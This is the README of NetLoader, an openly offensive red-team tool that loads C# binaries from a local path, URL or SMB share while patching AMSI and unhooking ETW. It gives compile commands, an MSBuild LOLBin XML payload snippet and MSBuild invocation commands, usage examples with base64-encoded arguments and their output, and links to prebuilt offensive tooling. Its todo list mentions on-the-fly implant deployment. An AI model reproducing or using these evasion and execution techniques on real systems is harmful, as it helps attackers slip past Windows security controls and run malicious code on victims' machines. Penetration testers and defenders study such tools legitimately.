# NetLoader
Loads any C# binary from filepath or url, patching AMSI and unhooks ETW

** 01.10.2021 : Non-Obfuscated source code + SharpSploit to 'bypass' userland hooks when patching AMSI and ETW**

**Looking for binaries/payloads to deploy? Checkout [SharpCollection](https://github.com/Flangvik/SharpCollection)**!.  
SharpCollection contains nightly builds of C# offensive tools, fresh from their respective master branches built and released in a CDI fashion using Azure DevOps release pipelines.

# Compile

	c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:RandomName.exe Program.cs

# Deploy via LOLBin (MSBuild)

Payload for MSBuild is in the /LOLBins folder, might push this for varius other LOLBins aswell.
Arguments have to be added into the bottom XML file when NetLoader is deployed using MSBuild

	Adding arguments to the XML payload
	    public class ClassExample : Task, ITask
	    {
	        public override bool Execute()
	        {	//Add your arguments here 
	            SoullikePrincelier.Main(new string[] { "--path", "\\smbshare\Seatbelt.exe" });
	            return true;
	        }
	    }

	For 64 bit:
	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe NetLoader.xml

	For 32 bit:
	C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe NetLoader.xml

# Usage
Deploy payload from local path or SMB share (note that NetLoader automatically detects whether the path provided is local or remote)

	PS C:\Users\Clark Kent\Desktop> .\NetLoader.exe --path Seatbelt.exe --args whoami
	[!] ~Flangvik , ~Arno0x #NetLoader
	[+] Successfully patched AMSI!
	[+] URL/PATH : Seatbelt.exe
	[+] Arguments : whoami


							%&&@@@&&
							&&&&&&&%%%,                       #&&@@@@@@%%%%%%###############%
							&%&   %&%%                        &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%
	%%%%%%%%%%%######%%%#%%####%  &%%**#                      @////(((&%%%%%%######################(((((((((((((((((((
	#%#%%%%%%%#######%#%%#######  %&%,,,,,,,,,,,,,,,,         @////(((&%%%%%#%#####################(((((((((((((((((((
	#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&%%%%%%%######################(#(((#(#((((((((((
	#####%%%####################  &%%......  ...   ..         @////(((&%%%%%%%###############%######((#(#(####((((((((
	#######%##########%#########  %%%......  ...   ..         @////(((&%%%%%#########################(#(#######((#####
	###%##%%####################  &%%...............          @////(((&%%%%%%%%##############%#######(#########((#####
	#####%######################  %%%..                       @////(((&%%%%%%%################
							&%&   %%%%%      Seatbelt         %////(((&%%%%%%%%#############*
							&%%&&&%%%%%        v1.0.0         ,(((&%%%%%%%%%%%%%%%%%,
							 #%%%%##,


	ERROR: Error running command "whoami"


	[*] Completed collection in 0,008 seconds


Supports base64 inputs for those long strings that would usually break stuff! 

	PS C:\Users\Clark Kent\Desktop> .\NetLoader.exe --b64 --path U2VhdGJlbHQuZXhl --args d2hvYW1p
	[!] ~Flangvik , ~Arno0x #NetLoader
	[+] All arguments are Base64 encoded, decoding them on the fly
	[+] Successfully patched AMSI!
	[+] URL/PATH : Seatbelt.exe
	[+] Arguments : whoami


							%&&@@@&&
							&&&&&&&%%%,                       #&&@@@@@@%%%%%%###############%
							&%&   %&%%                        &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%
	%%%%%%%%%%%######%%%#%%####%  &%%**#                      @////(((&%%%%%%######################(((((((((((((((((((
	#%#%%%%%%%#######%#%%#######  %&%,,,,,,,,,,,,,,,,         @////(((&%%%%%#%#####################(((((((((((((((((((
	#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&%%%%%%%######################(#(((#(#((((((((((
	#####%%%####################  &%%......  ...   ..         @////(((&%%%%%%%###############%######((#(#(####((((((((
	#######%##########%#########  %%%......  ...   ..         @////(((&%%%%%#########################(#(#######((#####
	###%##%%####################  &%%...............          @////(((&%%%%%%%%##############%#######(#########((#####
	#####%######################  %%%..                       @////(((&%%%%%%%################
							&%&   %%%%%      Seatbelt         %////(((&%%%%%%%%#############*
							&%%&&&%%%%%        v1.0.0         ,(((&%%%%%%%%%%%%%%%%%,
							 #%%%%##,


	ERROR: Error running command "whoami"


	[*] Completed collection in 0,006 seconds


# Todo
- [X]  Automate the build and release of many of the Sharp Tools so they automagically appear in ~~/Binaries~~ [SharpCollection](https://github.com/Flangvik/SharpCollection) (CDI / Azure DevOps)
- [X]  Add support for non-interactive use (input args)
- [X]  Add support to run custom modules from your own URL or SMB Share (Great for on-the-fly Implant deployment)
- [X]  Add an working MSBuild XML payload for the LOLBins lovers (Myself included)
- [X]  Update with credits and links to the github repos that ~~/Binaries~~ [SharpCollection](https://github.com/Flangvik/SharpCollection) are compiled from

# Credits
[Arno0x](https://twitter.com/Arno0x0x) for the partial rewrite that is now merged into the main repo [see gist](https://gist.github.com/Arno0x/2b223114a726be3c5e7a9cacd25053a2)
[_RastaMouse](https://twitter.com/_RastaMouse/) for the [AMSI bypass](https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/master/ASBBypass/Program.cs)

